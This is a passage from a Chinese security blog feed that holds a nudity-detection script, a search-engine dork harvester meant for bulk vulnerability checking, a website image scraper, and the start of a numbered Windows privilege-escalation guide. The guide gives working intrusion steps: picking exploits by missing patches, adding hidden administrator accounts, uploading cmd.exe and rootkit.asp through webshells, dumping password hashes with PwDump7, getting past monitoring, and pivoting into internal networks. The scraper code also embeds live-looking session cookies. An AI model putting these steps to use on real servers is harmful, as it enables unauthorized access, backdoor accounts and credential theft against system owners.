class="built_in">return</span> self.result</div><div class="line"></div><div class="line">        <span class="comment"># 皮肤区域数量超过 60个，不是色情图片</span></div><div class="line">        <span class="keyword">if</span> len(self.skin_regions) &gt; 60:</div><div class="line">            self.message = <span class="string">"More than 60 skin regions (&#123;&#125;)"</span>.format(len(self.skin_regions))</div><div class="line">            self.result = False</div><div class="line">            <span class="built_in">return</span> self.result</div><div class="line"></div><div class="line">        <span class="comment"># 其它情况为色情图片</span></div><div class="line">        self.message = <span class="string">"Nude!!"</span></div><div class="line">        self.result = True</div><div class="line">        <span class="built_in">return</span> self.result</div><div class="line"></div><div class="line">    <span class="comment"># 基于像素的肤色检测技术</span></div><div class="line">    def _classify_skin(self, r, g, b):</div><div class="line">        <span class="comment"># 根据RGB值判定</span></div><div class="line">        rgb_classifier = r &gt; 95 and \</div><div class="line">            g &gt; 40 and g &lt; 100 and \</div><div class="line">            b &gt; 20 and \</div><div class="line">            max([r, g, b]) - min([r, g, b]) &gt; 15 and \</div><div class="line">            abs(r - g) &gt; 15 and \</div><div class="line">            r &gt; g and \</div><div class="line">            r &gt; b</div><div class="line">        <span class="comment"># 根据处理后的 RGB 值判定</span></div><div class="line">        nr, ng, nb = self._to_normalized(r, g, b)</div><div class="line">        norm_rgb_classifier = nr / ng &gt; 1.185 and \</div><div class="line">            <span class="built_in">float</span>(r * b) / ((r + g + b) ** 2) &gt; 0.107 and \</div><div class="line">            <span class="built_in">float</span>(r * g) / ((r + g + b) ** 2) &gt; 0.112</div><div class="line"></div><div class="line">        <span class="comment"># HSV 颜色模式下的判定</span></div><div class="line">        h, s, v = self._to_hsv(r, g, b)</div><div class="line">        hsv_classifier = h &gt; 0 and \</div><div class="line">            h &lt; 35 and \</div><div class="line">            s &gt; 0.23 and \</div><div class="line">            s &lt; 0.68</div><div class="line"></div><div class="line">        <span class="comment"># YCbCr 颜色模式下的判定</span></div><div class="line">        y, cb, cr = self._to_ycbcr(r, g,  b)</div><div class="line">        ycbcr_classifier = 97.5 &lt;= cb &lt;= 142.5 and 134 &lt;= cr &lt;= 176</div><div class="line"></div><div class="line">        <span class="comment"># 效果不是很好，还需改公式</span></div><div class="line">        <span class="comment"># return rgb_classifier or norm_rgb_classifier or hsv_classifier or ycbcr_classifier</span></div><div class="line">        <span class="built_in">return</span> ycbcr_classifier</div><div class="line"></div><div class="line">    def _to_normalized(self, r, g, b):</div><div class="line">        <span class="keyword">if</span> r == 0:</div><div class="line">            r = 0.0001</div><div class="line">        <span class="keyword">if</span> g == 0:</div><div class="line">            g = 0.0001</div><div class="line">        <span class="keyword">if</span> b == 0:</div><div class="line">            b = 0.0001</div><div class="line">        _sum = <span class="built_in">float</span>(r + g + b)</div><div class="line">        <span class="built_in">return</span> [r / _sum, g / _sum, b / _sum]</div><div class="line"></div><div class="line">    def _to_ycbcr(self, r, g, b):</div><div class="line">        <span class="comment"># 公式来源：</span></div><div class="line">        <span class="comment"># http://stackoverflow.com/questions/19459831/rgb-to-ycbcr-conversion-problems</span></div><div class="line">        y = .299*r + .587*g + .114*b</div><div class="line">        cb = 128 - 0.168736*r - 0.331364*g + 0.5*b</div><div class="line">        cr = 128 + 0.5*r - 0.418688*g - 0.081312*b</div><div class="line">        <span class="built_in">return</span> y, cb, cr</div><div class="line"></div><div class="line">    def _to_hsv(self, r, g, b):</div><div class="line">        h = 0</div><div class="line">        _sum = <span class="built_in">float</span>(r + g + b)</div><div class="line">        _max = <span class="built_in">float</span>(max([r, g, b]))</div><div class="line">        _min = <span class="built_in">float</span>(min([r, g, b]))</div><div class="line">        diff = <span class="built_in">float</span>(_max - _min)</div><div class="line">        <span class="keyword">if</span> _sum == 0:</div><div class="line">            _sum = 0.0001</div><div class="line"></div><div class="line">        <span class="keyword">if</span> _max == r:</div><div class="line">            <span class="keyword">if</span> diff == 0:</div><div class="line">                h = sys.maxsize</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                h = (g - b) / diff</div><div class="line">        <span class="keyword">elif</span> _max == g:</div><div class="line">            h = 2 + ((g - r) / diff)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            h = 4 + ((r - g) / diff)</div><div class="line"></div><div class="line">        h *= 60</div><div class="line">        <span class="keyword">if</span> h &lt; 0:</div><div class="line">            h += 360</div><div class="line"></div><div class="line">        <span class="built_in">return</span> [h, 1.0 - (3.0 * (_min / _sum)), (1.0 / 3.0) * _max]</div><div class="line"></div><div class="line">    def inspect(self):</div><div class="line">        _image = <span class="string">'&#123;&#125; &#123;&#125; &#123;&#125;×&#123;&#125;'</span>.format(self.image.filename, self.image.format, self.width, self.height)</div><div class="line">        <span class="built_in">return</span> <span class="string">"&#123;_image&#125;: result=&#123;_result&#125; message='&#123;_message&#125;'"</span>.format(_image=_image, _result=self.result, _message=self.message)</div><div class="line"></div><div class="line">    <span class="comment"># 将在源文件目录生成图片文件，将皮肤区域可视化</span></div><div class="line">    def showSkinRegions(self):</div><div class="line">        <span class="comment"># 未得出结果时方法返回</span></div><div class="line">        <span class="keyword">if</span> self.result is None:</div><div class="line">            <span class="built_in">return</span></div><div class="line">        <span class="comment"># 皮肤像素的 ID 的集合</span></div><div class="line">        skinIdSet = <span class="built_in">set</span>()</div><div class="line">        <span class="comment"># 将原图做一份拷贝</span></div><div class="line">        simage = self.image</div><div class="line">        <span class="comment"># 加载数据</span></div><div class="line">        simageData = simage.load()</div><div class="line"></div><div class="line">        <span class="comment"># 将皮肤像素的 id 存入 skinIdSet</span></div><div class="line">        <span class="keyword">for</span> sr <span class="keyword">in</span> self.skin_regions:</div><div class="line">            <span class="keyword">for</span> pixel <span class="keyword">in</span> sr:</div><div class="line">                skinIdSet.add(pixel.id)</div><div class="line">        <span class="comment"># 将图像中的皮肤像素设为白色，其余设为黑色</span></div><div class="line">        <span class="keyword">for</span> pixel <span class="keyword">in</span> self.skin_map:</div><div class="line">            <span class="keyword">if</span> pixel.id not <span class="keyword">in</span> skinIdSet:</div><div class="line">                simageData[pixel.x, pixel.y] = 0, 0, 0</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                simageData[pixel.x, pixel.y] = 255, 255, 255</div><div class="line">        <span class="comment"># 源文件绝对路径</span></div><div class="line">        filePath = os.path.abspath(self.image.filename)</div><div class="line">        <span class="comment"># 源文件所在目录</span></div><div class="line">        fileDirectory = os.path.dirname(filePath) + <span class="string">'/'</span></div><div class="line">        <span class="comment"># 源文件的完整文件名</span></div><div class="line">        fileFullName = os.path.basename(filePath)</div><div class="line">        <span class="comment"># 分离源文件的完整文件名得到文件名和扩展名</span></div><div class="line">        fileName, fileExtName = os.path.splitext(fileFullName)</div><div class="line">        <span class="comment"># 保存图片</span></div><div class="line">        simage.save(<span class="string">'&#123;&#125;&#123;&#125;_&#123;&#125;&#123;&#125;'</span>.format(fileDirectory, fileName,<span class="string">'Nude'</span> <span class="keyword">if</span> self.result <span class="keyword">else</span> <span class="string">'Normal'</span>, fileExtName))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    import argparse</div><div class="line"></div><div class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Detect nudity in images.'</span>)</div><div class="line">    parser.add_argument(<span class="string">'files'</span>, metavar=<span class="string">'image'</span>, nargs=<span class="string">'+'</span>,</div><div class="line">                        <span class="built_in">help</span>=<span class="string">'Images you wish to test'</span>)</div><div class="line">    parser.add_argument(<span class="string">'-r'</span>, <span class="string">'--resize'</span>, action=<span class="string">'store_true'</span>,</div><div class="line">                        <span class="built_in">help</span>=<span class="string">'Reduce image size to increase speed of scanning'</span>)</div><div class="line">    parser.add_argument(<span class="string">'-v'</span>, <span class="string">'--visualization'</span>, action=<span class="string">'store_true'</span>,</div><div class="line">                        <span class="built_in">help</span>=<span class="string">'Generating areas of skin image'</span>)</div><div class="line"></div><div class="line">    args = parser.parse_args()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> fname <span class="keyword">in</span> args.files:</div><div class="line">        <span class="keyword">if</span> os.path.isfile(fname):</div><div class="line">            n = Nude(fname)</div><div class="line">            <span class="keyword">if</span> args.resize:</div><div class="line">                n.resize(maxheight=800, maxwidth=600)</div><div class="line">            n.parse()</div><div class="line">            <span class="keyword">if</span> args.visualization:</div><div class="line">                n.showSkinRegions()</div><div class="line">            <span class="built_in">print</span>(n.result, n.inspect())</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="built_in">print</span>(fname, <span class="string">"is not a file"</span>)</div></pre></td></tr></table></figure></p>
<p>思考：鉴黄师自动化脚本，差点笑出声。</p>
<h2 id="渗透语法收集器"><a href="#渗透语法收集器" class="headerlink" title="渗透语法收集器"></a>渗透语法收集器</h2><p>还是一个爬虫，输入百度语法，或者改动一下谷歌语法，收集该语法下的url，批量验证漏洞。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line">import urllib.request</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">import requests</div><div class="line"></div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">'Host'</span>] = <span class="string">'www.baidu.com'</span></div><div class="line">header[<span class="string">'User-Agent'</span>] = <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0)Gecko/20100101 Firefox/54.0'</span></div><div class="line">header[<span class="string">'Accept'</span>] = <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span></div><div class="line">header[<span class="string">'Accept-Language'</span>] = <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span></div><div class="line">header[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip, deflate, br'</span></div><div class="line">header[<span class="string">'Cookie'</span>] = <span class="string">'BAIDUID=7FF6B65C12082D4620B627B8C3D42995:FG=1; BIDUPSID=7FF6B65C12082D4620B627B8C3D42995; PSTM=1497660046; BD_UPN=13314352; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; sug=3; sugstore=0; ORIGIN=0; bdime=0; BDUSS=1J2ZHNYcHZvTUR0fkhLa2lDMzR6ZnRVLTVkUzV3SnZaSUhLc3FvTGFwZ1RSSEJaSVFBQUFBJCQAAAAAAAAAAAEAAAD0POxU0sC-ybjftffs4QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABO3SFkTt0hZN; __cfduid=d9f32e301169f6f07bf08af4721364b601498009206; BDRCVFR[Fc9oatPmwxn]=G01CoNuskzfuh-zuyuEXAPCpy49QhP8; BD_CK_SAM=1; PSINO=5; H_PS_PSSID=23083_1423_21117_17001_21928_20927; B64_BOT=1; BD_HOME=1; BDRCVFR[feWj1Vr5u3D]=I67x6TjHwwYf0; rsv_jmp_slow=1498181697500; H_PS_645EC=0811GQcKJ8F%2Fxv6BYKHoJME8JXNS%2BKoas3Nuspr0t7zbaHYC5OVeoy2Dtls'</span></div><div class="line">header[<span class="string">'Connection'</span>] = <span class="string">'close'</span></div><div class="line">header[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line"><span class="comment"># header['X-Forwarded-For'] = '1.1.1.1'</span></div><div class="line"><span class="comment"># header[''] = ''</span></div><div class="line"><span class="comment"># header[''] = ''</span></div><div class="line"></div><div class="line">indexUrl = <span class="string">'https://www.baidu.com'</span></div><div class="line"></div><div class="line">word = input(<span class="string">"请输入百度语法："</span>)</div><div class="line"><span class="comment"># word = 'inurl:asp?id='</span></div><div class="line"></div><div class="line">page = <span class="string">'&amp;pn='</span></div><div class="line">page_number = 0</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> page_number <span class="keyword">in</span> range(0,200,10):</div><div class="line">    targetUrl = indexUrl + <span class="string">'/s?wd='</span> + word + page + str(page_number)</div><div class="line">    results = requests.get(targetUrl, headers=header,timeout=15)</div><div class="line">    results.raise_for_status()</div><div class="line">    detail = BeautifulSoup(results.content, <span class="string">'lxml'</span>)</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> detail.find_all(<span class="string">'div'</span>):</div><div class="line"></div><div class="line">         link = x.get(<span class="string">'data-tools'</span>)</div><div class="line"></div><div class="line">         <span class="keyword">if</span> link:</div><div class="line">             try:</div><div class="line">                 url = str(link)[link.find(<span class="string">'"url":"'</span>):]</div><div class="line">                 url = url[7:-2]</div><div class="line">                 final_url = urllib.request.urlopen(url).geturl()</div><div class="line">                 <span class="keyword">if</span> word[6:] <span class="keyword">in</span> final_url:</div><div class="line">                     f = open(<span class="string">'C:/Users/qgs-wm/PycharmProjects/untitled/word.txt'</span>,<span class="string">'a+'</span>)</div><div class="line">                     f.write(final_url+<span class="string">'\n'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">             except:</div><div class="line">                 pass</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">print</span>(<span class="string">'end!'</span>)</div></pre></td></tr></table></figure></p>
<p>思考：k8的s2验证工具有批量的功能，所以……或者,玩玩sqlmap？</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>练习才能完美，多练练总是好的。</p>
]]></content>
      
        <categories>
            
            <category> 杂项 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[爬虫实战经历]]></title>
      <url>http://www.warmeng.com/2017/06/09/spider/</url>
      <content type="html"><![CDATA[<p>毕业的东西总算全部搞完了，有闲情来弄博客了，毕业还挺伤感的。</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>由老师给的一个兼职任务，对户型图网站的图片的抓取，整个端午节都在研究这个东西，总算是弄出来了。</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>目标网站为<a href="https://www.kujiale.com/huxing/reside/,&quot;title&quot;" target="_blank" rel="external">户型图</a> 。<br>打开robots.txt发现目标网站的网站地图。<a href="http://www.kujiale.com/sitemap_index.xml" target="_blank" rel="external">网站地图</a> 。<br>根据网站地图收集所需要的url。根据下面代码爬取到所有的loc标签，通过标签下载下来所有的loc的url。<br>使用subline通过正则表达式find出所有带有huxing/hangzhou的url。<br>使用脚本对每个url进行访问。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># !/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import threading</div><div class="line">import random</div><div class="line">import time</div><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">import re</div><div class="line"></div><div class="line">threads = []</div><div class="line">request = requests.session()</div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">"Host"</span>] = <span class="string">"www.kujiale.com"</span></div><div class="line">header[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">header[<span class="string">"Accept"</span>] = <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span></div><div class="line">header[<span class="string">"Accept-Language"</span>] = <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span></div><div class="line">header[<span class="string">"Accept-Encoding"</span>] = <span class="string">"gzip, deflate, br"</span></div><div class="line">header[<span class="string">"Cookie"</span>] = <span class="string">"KSESSIONID=d98ab2aa-8e73-4475-a1d3-b6b9ec32131c; gr_user_id=2c1c9985-db0d-4631-bfcf-9badbfd90ff7; Hm_lvt_bd8fd4c378d7721976f466053bd4a855=1495932728,1496019873; _ga=GA1.2.2058694673.1495932730; _gid=GA1.2.1642389268.1496019877; hasShownFootAd=true; kjl_sessionid=7843d03a-05e9-41eb-acaa-fc745a0c29a1; qqconn_access_token=571959B96EAFD7B00EF59A830D5A04FA; qqconn_openid=7F1637AF553192C0210D62BD83266049; qhssokey=3FO4K9RIQKVTVK7O138C; qhssokeyid=VK7O138C; qhssokeycheck=3FO4K9RIQKVT; 2017-05-28-sign-3FO4K9RIQKVT=false; landingpageurl=http://www.kujiale.com/huxing/reside/; 2017-05-29-sign-3FO4K9RIQKVT=false; kjl_usercityid=175; gr_session_id_a4a13a22eb51522b=b58ac865-047b-4767-a85d-b50198e13b9b; gr_cs1_b58ac865-047b-4767-a85d-b50198e13b9b=userId%3A3FO4K9RIQKVT; JSESSIONID=1o61l8us4a7rwtfvyj8mntc5y; Hm_lpvt_bd8fd4c378d7721976f466053bd4a855=1496019877"</span></div><div class="line">header[<span class="string">"Connection"</span>] = <span class="string">"keep-alive"</span></div><div class="line"></div><div class="line"></div><div class="line">def dowloadPic(imageUrl, filePath):</div><div class="line">    r = requests.get(imageUrl)</div><div class="line">    with open(filePath, <span class="string">"wb"</span>) as code:</div><div class="line">        code.write(r.content)</div><div class="line">indexUrl = <span class="string">"https://www.kujiale.com/sitemap_index.xml"</span></div><div class="line"></div><div class="line"></div><div class="line">results = request.get(indexUrl, headers=header)<span class="comment">#进入1级地图并且遍历</span></div><div class="line">detail = str(BeautifulSoup(results.content,<span class="string">"lxml"</span>))</div><div class="line">links = re.findall(<span class="string">'&lt;loc&gt;(.*?)&lt;/loc&gt;'</span>,detail)</div><div class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:</div><div class="line">  link2 = str(link)</div><div class="line">  results2 = request.get(link2,headers=header)<span class="comment">#2级地图并且遍历</span></div><div class="line">  detail2 = str(BeautifulSoup(results2.content,<span class="string">'lxml'</span>))</div><div class="line">  jieguos = re.findall(<span class="string">'&lt;loc&gt;(.*?)&lt;/loc&gt;'</span>,detail2)</div><div class="line">  <span class="keyword">for</span> jieguo <span class="keyword">in</span> jieguos:</div><div class="line">      jieguo2 = str(jieguo)</div><div class="line">      <span class="built_in">print</span> jieguo2</div><div class="line">      w = open(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/666.txt"</span>, <span class="string">"a+"</span>)</div><div class="line">      w.write(jieguo2 + <span class="string">'\r\n'</span>)</div></pre></td></tr></table></figure></p>
<h2 id="信息筛选"><a href="#信息筛选" class="headerlink" title="信息筛选"></a>信息筛选</h2><p>筛选的的结果如图所示:<img src="/images/20170612/1.png" alt="">，然后讲所筛选的url进行访问，通过正则找到带有目标的jpg url<br>然后讲其下载，如下面代码所示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import threading</div><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">import re</div><div class="line">import os</div><div class="line">import random</div><div class="line">threads = []</div><div class="line">request = requests.session()</div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">"Host"</span>] = <span class="string">"www.kujiale.com"</span></div><div class="line">header[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">header[<span class="string">"Accept"</span>] = <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span></div><div class="line">header[<span class="string">"Accept-Language"</span>] = <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span></div><div class="line">header[<span class="string">"Accept-Encoding"</span>] = <span class="string">"gzip, deflate, br"</span></div><div class="line">header[<span class="string">"Cookie"</span>] = <span class="string">"KSESSIONID=d98ab2aa-8e73-4475-a1d3-b6b9ec32131c; gr_user_id=2c1c9985-db0d-4631-bfcf-9badbfd90ff7; Hm_lvt_bd8fd4c378d7721976f466053bd4a855=1495932728,1496019873,1496075232,1496075460; _ga=GA1.2.2058694673.1495932730; _gid=GA1.2.194016103.1496105563; qqconn_access_token=571959B96EAFD7B00EF59A830D5A04FA; qqconn_openid=7F1637AF553192C0210D62BD83266049; qhssokey=3FO4K9RIQKVT7QT1GWWPW; qhssokeyid=7QT1GWWPW; qhssokeycheck=3FO4K9RIQKVT; kjl_sessionid=60u1zks6yn631tkr5yk8kwn9p; Hm_lvt_55cf859f19ff9efb2389c232abf347a6=1496072964; UM_distinctid=15c54e5c72e477-03018d1179e9b4-49526a-fa000-15c54e5c72f247; _jzqa=1.4592844170854785500.1496072964.1496072964.1496072964.1; _jzqckmp=1; 2017-05-30-sign-3FO4K9RIQKVT=false; CNZZDATA1000449964=260878689-1496072838-%7C1496072838; Hm_lpvt_bd8fd4c378d7721976f466053bd4a855=1496105563; JSESSIONID=kvqb4k8qggoe1p8yxprk63yxj; gr_session_id_a4a13a22eb51522b=b707aa5c-e8f7-4d84-8813-e94c309b1f7c; gr_cs1_b707aa5c-e8f7-4d84-8813-e94c309b1f7c=userId%3A3FO4K9RIQKVT; DIYSERVERS=1"</span></div><div class="line">header[<span class="string">"Connection"</span>] = <span class="string">"keep-alive"</span></div><div class="line"></div><div class="line"></div><div class="line">def dowloadPic(imageUrl, filePath):</div><div class="line">    try:</div><div class="line">        r = requests.get(imageUrl)</div><div class="line">        with open(filePath, <span class="string">"wb"</span>) as code:</div><div class="line">            code.write(r.content)</div><div class="line">    except:</div><div class="line">        pass</div><div class="line">f = open(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/hangzhou1.txt"</span>, <span class="string">"r"</span>)<span class="comment">#打开本地杭州url</span></div><div class="line">lines = f.readlines()</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">    indexUrl = line</div><div class="line">    results = request.get(line, headers=header)</div><div class="line">    titlename = str(BeautifulSoup(results.content).title)</div><div class="line">    titlename = titlename[7:-7]</div><div class="line">    name = line[30:]+str(titlename)</div><div class="line">    <span class="built_in">print</span> name</div><div class="line">    try:</div><div class="line">        results = request.get(indexUrl, headers=header)</div><div class="line">        detail = str(BeautifulSoup(results.content,<span class="string">"lxml"</span>))</div><div class="line">    except:</div><div class="line">        pass</div><div class="line"></div><div class="line">    tupians = re.findall(r<span class="string">'src="https://(.*).jpg@!480w"'</span>,detail)<span class="comment">#找到带有jpg的url</span></div><div class="line">    <span class="keyword">if</span> len(tupians)!=0:</div><div class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/"</span> + name.strip()):<span class="comment">#判断分类文件夹是否存在</span></div><div class="line">            pass</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            os.mkdir(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/"</span> + name.strip())<span class="comment">#创建分类的文件夹</span></div><div class="line">            file = open(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/"</span> + name.strip() + <span class="string">"/2.txt"</span>, <span class="string">'w'</span>)<span class="comment">#创建分类文件下的2.txt</span></div><div class="line">            file.close()</div><div class="line">        <span class="keyword">for</span> tupian <span class="keyword">in</span> tupians:</div><div class="line">          tupian = <span class="string">'https://'</span> + str(tupian) + <span class="string">'.jpg'</span></div><div class="line"></div><div class="line">          path = <span class="string">'/Users/nevermore/Desktop/HUXINGTU/'</span>+name.strip()+<span class="string">'/'</span>+str(random.randint(0,1000000)) +<span class="string">'.jpg'</span></div><div class="line"></div><div class="line">          <span class="built_in">print</span> tupian</div><div class="line"></div><div class="line">          dowloadPic(tupian,path)</div></pre></td></tr></table></figure></p>
<p>开始批量的下载，在寝室下载因为网络问题，反而没有被反爬监测出来，跑到学校的电脑上爬，1分钟就被监测出来了。<br>只好加个sleep了。下载的东西如下图所示:<img src="/images/20170612/2.png" alt="">，<img src="/images/20170612/3.png" alt="">。<br>这里只取少量，所有的杭州户型图已经全部爬取完毕在学校的电脑里。</p>
<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>毕业设计就是爬虫和反爬虫，现在又正经的玩了一遍，整个过程中遇到了很多的问题和麻烦但也乐在其中。</p>
]]></content>
      
        <categories>
            
            <category> 实战过程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[提权和lcx的使用]]></title>
      <url>http://www.warmeng.com/2017/04/19/r&amp;l/</url>
      <content type="html"><![CDATA[<p>小小的纪录一下提权的小攻略和lcx转发的小操作。</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>毕业设计真的烦！写个博客换换心情！</p>
<h2 id="提权攻略"><a href="#提权攻略" class="headerlink" title="提权攻略"></a>提权攻略</h2><p>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user<br>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。<br>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。<br>4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。<br>5.创建用户：net user username password ／add；设置为管理员：net localgroup administrators username ／add；如果要把用户设置成隐藏的用户，你可以在username后面加一个‘$’字符。<br>6.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！<br>7.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”<br>8.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。<br>9.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。<br>10.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程<br>11.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。<br>12.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。<br>13.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。<br>14.当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:\Documents and Settings\All Users\Application Data\Microsoft 目录 然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～1<br>15.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators<br>16.进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin 